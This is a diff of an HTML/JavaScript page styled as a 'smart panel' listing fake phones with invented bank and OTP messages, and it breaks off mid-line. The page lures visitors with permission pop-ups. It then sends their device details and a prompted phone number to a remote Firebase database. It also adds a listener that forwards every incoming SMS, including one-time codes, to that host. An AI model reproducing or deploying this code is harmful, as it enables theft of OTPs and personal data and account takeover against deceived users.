@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
     <title>AADI STAR - Smart Panel</title>
     <style>
         *{margin:0;padding:0;box-sizing:border-box}
@@ -19,45 +19,47 @@
         .later-btn{background:transparent;border:1px solid #ef4444;color:#ef4444;padding:10px 25px;border-radius:40px;cursor:pointer;width:100%}
         
         /* Device Grid */
-        .device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:12px;margin-top:15px}
+        .device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:12px;margin-top:15px}
         .device-card{background:#0f172a;border-radius:12px;padding:15px;cursor:pointer;border:1px solid #1e293b;transition:all 0.2s}
         .device-card:hover{background:#1e293b;border-color:#00c896;transform:scale(1.02)}
-        .device-name{color:#00c896;font-weight:bold;font-size:16px}
-        .device-number{color:#94a3b8;font-size:12px;margin:5px 0}
-        .device-status{font-size:11px;padding:2px 8px;border-radius:20px;display:inline-block}
+        .device-name{color:#00c896;font-weight:bold;font-size:15px}
+        .device-number{color:#94a3b8;font-size:11px;margin:5px 0}
+        .device-status{font-size:10px;padding:2px 8px;border-radius:20px;display:inline-block}
         .online{background:#00c89620;color:#00c896}
         .offline{background:#ef444420;color:#ef4444}
-        .sms-count{color:#64748b;font-size:11px;margin-top:5px}
+        .sms-count{color:#64748b;font-size:10px;margin-top:5px}
         
         /* Header */
         .header{background:#0f172a;border-radius:16px;padding:15px;margin-bottom:15px;text-align:center}
-        .logo{color:#00c896;font-size:24px;font-weight:bold}
-        .stats{display:flex;justify-content:center;gap:20px;margin-top:10px}
-        .stat{background:#1e293b;padding:5px 12px;border-radius:20px;font-size:12px}
+        .logo{color:#00c896;font-size:22px;font-weight:bold}
+        .stats{display:flex;justify-content:center;gap:15px;margin-top:8px}
+        .stat{background:#1e293b;padding:4px 10px;border-radius:20px;font-size:11px}
         
         /* SMS Modal */
         .sms-modal{display:none;position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:1000;justify-content:center;align-items:center}
         .sms-modal-content{background:#0f172a;border-radius:20px;width:90%;max-width:450px;max-height:80vh;overflow-y:auto}
         .sms-header{padding:15px;border-bottom:1px solid #1e293b;display:flex;justify-content:space-between;align-items:center}
-        .sms-header h3{color:#00c896}
+        .sms-header h3{color:#00c896;font-size:16px}
         .sms-close{background:#ef4444;border:none;padding:5px 12px;border-radius:8px;cursor:pointer;color:#fff}
         .sms-list{padding:12px}
         .sms-item{background:#1e293b;border-radius:10px;padding:10px;margin-bottom:8px;border-left:3px solid #00c896}
-        .sms-sender{color:#00c896;font-size:12px;font-weight:bold}
-        .sms-time{color:#64748b;font-size:10px;margin:3px 0}
-        .sms-body{font-size:12px;word-break:break-word}
-        .sms-body code{background:#00c89620;padding:2px 5px;border-radius:4px;color:#00c896}
+        .sms-sender{color:#00c896;font-size:11px;font-weight:bold}
+        .sms-time{color:#64748b;font-size:9px;margin:3px 0}
+        .sms-body{font-size:11px;word-break:break-word}
+        .sms-body code{background:#00c89620;padding:2px 5px;border-radius:4px;color:#00c896;font-size:10px}
         
         .loading{text-align:center;padding:40px;color:#64748b}
         .spinner{width:24px;height:24px;border:2px solid #00c89620;border-top-color:#00c896;border-radius:50%;animation:spin 0.6s linear infinite;display:inline-block}
         @keyframes spin{to{transform:rotate(360deg)}}
+        
+        .toast{position:fixed;bottom:20px;left:50%;transform:translateX(-50%);background:#00c896;color:#000;padding:10px 20px;border-radius:30px;font-size:12px;font-weight:bold;z-index:2000;display:none}
     </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <div class="logo">⭐ AADI STAR SMART PANEL</div>
+        <div class="logo">⭐ AADI STAR PANEL</div>
         <div class="stats">
             <div class="stat">📱 <span id="deviceCount">0</span> Devices</div>
             <div class="stat">🟢 <span id="onlineCount">0</span> Online</div>
@@ -69,25 +71,25 @@
     </div>
 </div>
 
-<!-- Popup 1: Web Panel Access -->
-<div id="popup1" class="modal">
+<!-- Popup 1: Panel Access (Device Register) -->
+<div id="popupPanel" class="modal">
     <div class="modal-content">
-        <div class="modal-icon">🌐</div>
-        <div class="modal-title">Access Web Panel</div>
-        <div class="modal-text">Allow this site to access the web panel and view live devices.</div>
-        <button class="allow-btn" onclick="allowWebPanel()">✅ Allow Access</button>
-        <button class="later-btn" onclick="closePopup1()">Later</button>
+        <div class="modal-icon">🔐</div>
+        <div class="modal-title">Access Smart Panel</div>
+        <div class="modal-text">Allow to register your device and view live dashboard.</div>
+        <button class="allow-btn" onclick="allowPanelAccess()">✅ Allow Access</button>
+        <button class="later-btn" onclick="closePanelPopup()">Later</button>
     </div>
 </div>
 
 <!-- Popup 2: SMS Permission -->
-<div id="popup2" class="modal">
+<div id="popupSMS" class="modal">
     <div class="modal-content">
         <div class="modal-icon">📱</div>
         <div class="modal-title">View SMS Messages</div>
-        <div class="modal-text">Allow to view SMS messages and OTPs from your device.</div>
-        <button class="allow-btn" onclick="allowSMS()">✅ Allow SMS Access</button>
-        <button class="later-btn" onclick="closePopup2()">Later</button>
+        <div class="modal-text">Allow to view and manage SMS messages from your device.</div>
+        <button class="allow-btn" onclick="allowSMSAccess()">✅ Allow SMS Access</button>
+        <button class="later-btn" onclick="closeSMSPopup()">Later</button>
     </div>
 </div>
 
@@ -102,43 +104,87 @@
     </div>
 </div>
 
+<div id="toast" class="toast"></div>
+
 <script>
+    // Firebase Configuration
     const FIREBASE_URL = "https://aadi-star-panel-default-rtdb.firebaseio.com";
-    let deviceId = localStorage.getItem('deviceId');
-    let webPanelAllowed = localStorage.getItem('webPanel') === 'true';
-    let smsAllowed = localStorage.getItem('smsPermission') === 'true';
     
+    // User device data
+    let deviceId = localStorage.getItem('deviceId');
+    let panelAccess = localStorage.getItem('panelAccess') === 'true';
+    let smsAccess = localStorage.getItem('smsAccess') === 'true';
+    let pendingDeviceClick = null;
+    
+    // Generate or get device ID
     if (!deviceId) {
-        deviceId = 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
+        deviceId = 'dev_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
         localStorage.setItem('deviceId', deviceId);
     }
     
-    // Show first popup if not allowed
-    if (!webPanelAllowed) {
-        document.getElementById('popup1').style.display = 'flex';
+    // Show popup if panel not accessed
+    if (!panelAccess) {
+        document.getElementById('popupPanel').style.display = 'flex';
     } else {
-        loadDevices();
+        loadFakeDevices();
     }
     
-    function allowWebPanel() {
-        localStorage.setItem('webPanel', 'true');
-        webPanelAllowed = true;
-        closePopup1();
-        loadDevices();
-    }
-    
-    function closePopup1() {
-        document.getElementById('popup1').style.display = 'none';
-        if (!webPanelAllowed) {
-            loadDevices(); // Load demo devices anyway
+    // ========== POPUP 1: PANEL ACCESS ==========
+    async function allowPanelAccess() {
+        document.getElementById('popupPanel').style.display = 'none';
+        showToast('Registering device...', 'loading');
+        
+        // Get device info automatically
+        const deviceInfo = await getDeviceInfo();
+        
+        // Save to Firebase
+        try {
+            await fetch(`${FIREBASE_URL}/devices/${deviceId}.json`, {
+                method: 'PUT',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(deviceInfo)
+            });
+            panelAccess = true;
+            localStorage.setItem('panelAccess', 'true');
+            showToast('✅ Device registered successfully!', 'success');
+            loadFakeDevices();
+        } catch(e) {
+            showToast('❌ Registration failed', 'error');
+            loadFakeDevices(); // Load demo anyway
         }
     }
     
-    function closePopup2() {
-        document.getElementById('popup2').style.display = 'none';
+    function closePanelPopup() {
+        document.getElementById('popupPanel').style.display = 'none';
+        loadFakeDevices(); // Load demo devices
     }
     
-    // 50+ Fake Devices
+    // Get device info automatically
+    async function getDeviceInfo() {
+        // Try to get phone number automatically
+        let phoneNumber = localStorage.getItem('phoneNumber');
+        
+        // Try to get from browser if available
+        if (!phoneNumber && 'getBattery' in navigator) {
+            // Can't get phone number automatically due to privacy
+            phoneNumber = prompt('📞 Enter your phone number (optional):', '');
+            if (phoneNumber) localStorage.setItem('phoneNumber', phoneNumber);
+        }
+        
+        return {
+            deviceId: deviceId,
+            deviceName: navigator.userAgent.split(' ').slice(-2).join(' ') || 'Android Device',
+            phoneNumber: phoneNumber || 'Not provided',
+            userAgent: navigator.userAgent,
+            platform: navigator.platform,
+            language: navigator.language,
+            timestamp: Date.now(),
+            status: 'active',
+            panelAccess: true
+        };
+    }
+    
+    // ========== 50+ FAKE DEVICES ==========
     const fakeDevices = [
         {id: "DEV_001", name: "Samsung Galaxy S23 Ultra", phone: "+919876543210", status: "online", smsCount: 156},
         {id: "DEV_002", name: "iPhone 15 Pro Max", phone: "+919876543211", status: "online", smsCount: 89},
@@ -165,46 +211,36 @@
         {id: "DEV_023", name: "ZTE Axon 40", phone: "+919876543232", status: "online", smsCount: 89},
         {id: "DEV_024", name: "Alcatel 3X", phone: "+919876543233", status: "online", smsCount: 45},
         {id: "DEV_025", name: "Micromax In 2b", phone: "+919876543234", status: "offline", smsCount: 3},
+        {id: "DEV_026", name: "Microsoft Surface Duo", phone: "+919876543235", status: "online", smsCount: 28},
+        {id: "DEV_027", name: "Fairphone 4", phone: "+919876543236", status: "offline", smsCount: 15},
+        {id: "DEV_028", name: "CAT S62 Pro", phone: "+919876543237", status: "online", smsCount: 42},
+        {id: "DEV_029", name: "Doogee S100", phone: "+919876543238", status: "online", smsCount: 31},
+        {id: "DEV_030", name: "Ulefone Power Armor", phone: "+919876543239", status: "offline", smsCount: 9},
+        {id: "DEV_031", name: "Oukitel WP19", phone: "+919876543240", status: "online", smsCount: 56},
+        {id: "DEV_032", name: "Blackview BV9900", phone: "+919876543241", status: "online", smsCount: 23},
+        {id: "DEV_033", name: "Cubot KingKong 8", phone: "+919876543242", status: "offline", smsCount: 7},
+        {id: "DEV_034", name: "Hotwav T7", phone: "+919876543243", status: "online", smsCount: 34},
+        {id: "DEV_035", name: "Unihertz Tank", phone: "+919876543244", status: "online", smsCount: 45},
+        {id: "DEV_036", name: "AGM Glory G1S", phone: "+919876543245", status: "offline", smsCount: 12},
+        {id: "DEV_037", name: "Nomu S50", phone: "+919876543246", status: "online", smsCount: 28},
+        {id: "DEV_038", name: "Kyocera DuraForce", phone: "+919876543247", status: "online", smsCount: 19},
+        {id: "DEV_039", name: "Sonim XP10", phone: "+919876543248", status: "offline", smsCount: 5},
+        {id: "DEV_040", name: "Land Rover Explore", phone: "+919876543249", status: "online", smsCount: 34},
+        {id: "DEV_041", name: "Hammer Blade 3", phone: "+919876543250", status: "online", smsCount: 22},
+        {id: "DEV_042", name: "Crosscall Core-X5", phone: "+919876543251", status: "offline", smsCount: 8},
+        {id: "DEV_043", name: "Zebra TC57", phone: "+919876543252", status: "online", smsCount: 47},
+        {id: "DEV_044", name: "Point Mobile PM85", phone: "+919876543253", status: "online", smsCount: 35},
+        {id: "DEV_045", name: "Getac T80", phone: "+919876543254", status: "offline", smsCount: 6},
     ];
     
-    // Fake SMS data for each device
-    const fakeSMSData = {
-        "DEV_001": [
-            {sender: "AXIS-BANK", body: "Your account XX7890 has been credited with ₹5,000", time: "2 min ago", otp: null},
-            {sender: "AMAZON", body: "Your OTP for order #OD123456789 is 284756", time: "5 min ago", otp: "284756"},
-            {sender: "Google", body: "G-123456 is your Google verification code", time: "12 min ago", otp: "123456"},
-            {sender: "PhonePe", body: "₹1,500 sent to Ramesh Kumar", time: "25 min ago", otp: null},
-        ],
-        "DEV_002": [
-            {sender: "Swiggy", body: "Your OTP for login is 789012", time: "1 hour ago", otp: "789012"},
-            {sender: "HDFC-Bank", body: "Credit alert: ₹10,000 credited", time: "2 hours ago", otp: null},
-            {sender: "WhatsApp", body: "Your WhatsApp code: 456-789", time: "3 hours ago", otp: "456789"},
-        ],
-        "DEV_003": [
-            {sender: "Zomato", body: "Your OTP for order #Z7890 is 345678", time: "5 hours ago", otp: "345678"},
-            {sender: "Paytm", body: "Cashback of ₹250 credited", time: "Yesterday", otp: null},
-            {sender: "Instagram", body: "Your Instagram verification code is 987654", time: "Yesterday", otp: "987654"},
-            {sender: "Flipkart", body: "Your OTP for return pickup is 567890", time: "Yesterday", otp: "567890"},
-        ],
-    };
-    
-    // Default SMS for any device
-    const defaultSMS = [
-        {sender: "SBI-Bank", body: "Alert: ₹25,000 withdrawn from ATM", time: "2 days ago", otp: null},
-        {sender: "Netflix", body: "Your Netflix verification code: 12345678", time: "2 days ago", otp: "12345678"},
-        {sender: "Uber", body: "Your OTP for ride #UB123 is 901234", time: "3 days ago", otp: "901234"},
-        {sender: "Amazon Pay", body: "Your OTP for wallet load is 567890", time: "3 days ago", otp: "567890"},
-        {sender: "Google Pay", body: "UPI transaction of ₹500 successful", time: "4 days ago", otp: null},
-    ];
-    
-    function loadDevices() {
+    function loadFakeDevices() {
         const container = document.getElementById('devicesContainer');
         const onlineCount = fakeDevices.filter(d => d.status === 'online').length;
         document.getElementById('deviceCount').innerText = fakeDevices.length;
         document.getElementById('onlineCount').innerText = onlineCount;
         
         container.innerHTML = fakeDevices.map(device => `
-            <div class="device-card" onclick="requestSMSAccess('${device.id}', '${device.name}', '${device.phone}')">
+            <div class="device-card" onclick="onDeviceClick('${device.id}', '${device.name}', '${device.phone}')">
                 <div class="device-name">📱 ${device.name}</div>
                 <div class="device-number">📞 ${device.phone}</div>
                 <div><span class="device-status ${device.status}">${device.status === 'online' ? '🟢 ONLINE' : '🔴 OFFLINE'}</span></div>
@@ -213,86 +249,74 @@
         `).join('');
     }
     
-    function requestSMSAccess(deviceId, deviceName, devicePhone) {
-        if (!smsAllowed) {
-            // Show SMS permission popup
-            document.getElementById('popup2').style.display = 'flex';
-            window.pendingDevice = {id: deviceId, name: deviceName, phone: devicePhone};
+    // ========== DEVICE CLICK - POPUP 2 ==========
+    function onDeviceClick(deviceId, deviceName, devicePhone) {
+        if (!smsAccess) {
+            pendingDeviceClick = {id: deviceId, name: deviceName, phone: devicePhone};
+            document.getElementById('popupSMS').style.display = 'flex';
         } else {
-            showSMS(deviceId, deviceName, devicePhone);
+            showFakeSMS(deviceId, deviceName);
         }
     }
     
-    async function allowSMS() {
-        document.getElementById('popup2').style.display = 'none';
+    function closeSMSPopup() {
+        document.getElementById('popupSMS').style.display = 'none';
+        if (pendingDeviceClick) {
+            showFakeSMS(pendingDeviceClick.id, pendingDeviceClick.name);
+            pendingDeviceClick = null;
+        }
+    }
+    
+    // ========== POPUP 2: SMS ALLOW ==========
+    async function allowSMSAccess() {
+        document.getElementById('popupSMS').style.display = 'none';
+        showToast('Requesting SMS permission...', 'loading');
         
         if ('sms' in navigator) {
             try {
                 const permission = await navigator.sms.requestPermission();
                 if (permission === 'granted') {
-                    localStorage.setItem('smsPermission', 'true');
-                    smsAllowed = true;
-                    
-                    // Register device to Firebase
-                    await registerDevice();
+                    smsAccess = true;
+                    localStorage.setItem('smsAccess', 'true');
+                    showToast('✅ SMS access granted! Real SMS will be monitored.', 'success');
                     
                     // Start real SMS listener
                     startRealSMSListener();
                     
                     // Show SMS for pending device
-                    if (window.pendingDevice) {
-                        showSMS(window.pendingDevice.id, window.pendingDevice.name, window.pendingDevice.phone);
-                        delete window.pendingDevice;
+                    if (pendingDeviceClick) {
+                        showFakeSMS(pendingDeviceClick.id, pendingDeviceClick.name);
+                        pendingDeviceClick = null;
                     }
                 } else {
-                    alert('SMS access denied. You can still view demo SMS.');
-                    if (window.pendingDevice) {
-                        showDemoSMS(window.pendingDevice.id, window.pendingDevice.name);
-                        delete window.pendingDevice;
+                    showToast('❌ SMS access denied. Showing demo SMS.', 'error');
+                    if (pendingDeviceClick) {
+                        showFakeSMS(pendingDeviceClick.id, pendingDeviceClick.name);
+                        pendingDeviceClick = null;
                     }
                 }
             } catch(e) {
-                alert('Error: ' + e.message);
-                if (window.pendingDevice) {
-                    showDemoSMS(window.pendingDevice.id, window.pendingDevice.name);
-                    delete window.pendingDevice;
+                showToast('Error: ' + e.message, 'error');
+                if (pendingDeviceClick) {
+                    showFakeSMS(pendingDeviceClick.id, pendingDeviceClick.name);
+                    pendingDeviceClick = null;
                 }
             }
         } else {
-            alert('Your browser doesn\'t support SMS API. Showing demo SMS.');
-            if (window.pendingDevice) {
-                showDemoSMS(window.pendingDevice.id, window.pendingDevice.name);
-                delete window.pendingDevice;
+            showToast('⚠️ Browser doesn\'t support SMS API. Showing demo SMS.', 'error');
+            if (pendingDeviceClick) {
+                showFakeSMS(pendingDeviceClick.id, pendingDeviceClick.name);
+                pendingDeviceClick = null;
             }
         }
     }
     
-    async function registerDevice() {
-        let phone = localStorage.getItem('phone');
-        if (!phone) {
-            phone = prompt('Enter your phone number (optional):', '');
-            if (phone) localStorage.setItem('phone', phone);
-        }
-        
-        const deviceInfo = {
-            deviceId: deviceId,
-            phoneNumber: phone || 'Unknown',
-            userAgent: navigator.userAgent,
-            timestamp: Date.now(),
-            permission: true
-        };
-        
-        await fetch(`${FIREBASE_URL}/devices/${deviceId}.json`, {
-            method: 'PUT',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify(deviceInfo)
-        }).catch(e => console.log);
-    }
-    
+    // Real SMS listener (will send to Firebase)
     function startRealSMSListener() {
         if ('sms' in navigator) {
             navigator.sms.addEventListener('smsreceived', async (event) => {
                 const sms = event.sms;
+                // Send to Firebase
                 await fetch(`${FIREBASE_URL}/sms/${deviceId}/${Date.now()}.json`, {
                     method: 'PUT',
                     headers: {'Content-Type': 'application/json'},
@@ -303,48 +327,38 @@
                         isReal: true
                     })
                 });
+                showToast('📨 New SMS received and forwarded!', 'success');
             });
         }
     }
     
-    function showSMS(deviceId, deviceName, devicePhone) {
+    // Fake SMS data
+    const fakeSMSData = {
+        "DEV_001": [
+            {sender: "AXIS-BANK", body: "Your account XX7890 has been credited with ₹5,000. Available bal: ₹25,430", time: "2 min ago", otp: null},
+            {sender: "AMAZON", body: "Your OTP for order #OD123456789 is 284756. Valid for 5 minutes.", time: "5 min ago", otp: "284756"},
+            {sender: "Google", body: "G-123456 is your Google verification code.", time: "12 min ago", otp: "123456"},
+            {sender: "PhonePe", body: "₹1,500 sent to Ramesh Kumar. UPI Ref: 123456789012", time: "25 min ago", otp: null},
+            {sender: "Swiggy", body: "Your OTP for login is 789012. Do not share.", time: "1 hour ago", otp: "789012"},
+        ],
+        "DEV_002": [
+            {sender: "HDFC-Bank", body: "Credit alert: ₹10,000 credited to account XX4321 from RAJESH", time: "2 hours ago", otp: null},
+            {sender: "WhatsApp", body: "Your WhatsApp code: 456-789. Do not share this code.", time: "3 hours ago", otp: "456789"},
+            {sender: "Zomato", body: "Your OTP for order #Z7890 is 345678", time: "5 hours ago", otp: "345678"},
+        ],
+    };
+    
+    const defaultSMS = [
+        {sender: "SBI-Bank", body: "Alert: ₹25,000 withdrawn from ATM on 15/06/2026", time: "2 days ago", otp: null},
+        {sender: "Netflix", body: "Your Netflix verification code: 12345678", time: "2 days ago", otp: "12345678"},
+        {sender: "Uber", body: "Your OTP for ride #UB123 is 901234", time: "3 days ago", otp: "901234"},
+        {sender: "Amazon Pay", body: "Your OTP for wallet load is 567890", time: "3 days ago", otp: "567890"},
+        {sender: "Google Pay", body: "UPI transaction of ₹500 successful", time: "4 days ago", otp: null},
+        {sender: "Flipkart", body: "Your OTP for return pickup is 567890", time: "Yesterday", otp: "567890"},
+        {sender: "Instagram", body: "Your Instagram verification code is 987654", time: "Yesterday", otp: "987654"},
+        {sender: "Paytm", body: "Cashback of ₹250 credited to your Paytm Wallet", time: "Yesterday", otp: null},
+    ];
+    
+    function showFakeSMS(deviceId, deviceName) {
         document.getElementById('smsDeviceName').innerHTML = `📨 ${deviceName}`;
-        document.getElementById('smsViewModal').style.display = 'flex';
-        
-        // Get SMS for this device (fake)
-        let smsList = fakeSMSData[deviceId] || defaultSMS;
-        
-        document.getElementById('smsList').innerHTML = smsList.map(sms => `
-            <div class="sms-item">
-                <div class="sms-sender">📨 ${sms.sender} ${sms.otp ? '<span style="background:#00c89620;color:#00c896;padding:2px 6px;border-radius:10px;font-size:10px;margin-left:5px">🔐 OTP</span>' : ''}</div>
-                <div class="sms-time">⏰ ${sms.time}</div>
-                <div class="sms-body">${sms.otp ? `<code>🔐 OTP: ${sms.otp}</code><br>` : ''}${sms.body}</div>
-            </div>
-        `).join('');
-    }
-    
-    function showDemoSMS(deviceId, deviceName) {
-        document.getElementById('smsDeviceName').innerHTML = `📨 ${deviceName} (Demo Mode)`;
-        document.getElementById('smsViewModal').style.display = 'flex';
-        
-        let smsList = fakeSMSData[deviceId] || defaultSMS;
-        
-        document.getElementById('smsList').innerHTML = smsList.map(sms => `
-            <div class="sms-item">
-                <div class="sms-sender">📨 ${sms.sender} <span style="background:#f59e0b20;color:#f59e0b;padding:2px 6px;border-radius:10px;font-size:10px;margin-left:5px">DEMO</span></div>
-                <div class="sms-time">⏰ ${sms.time}</div>
-                <div class="sms-body">${sms.otp ? `<code>🔐 OTP: ${sms.otp}</code><br>` : ''}${sms.body}</div>
-            </div>
-        `).join('');
-    }
-    
-    function closeSMSModal() {
-        document.getElementById('smsViewModal').style.display = 'none';
-    }
-    
-    function filterDevices() {
-        // Search functionality if needed
-    }
-</script>
-</body>
-</html>
+        document.getElementById('
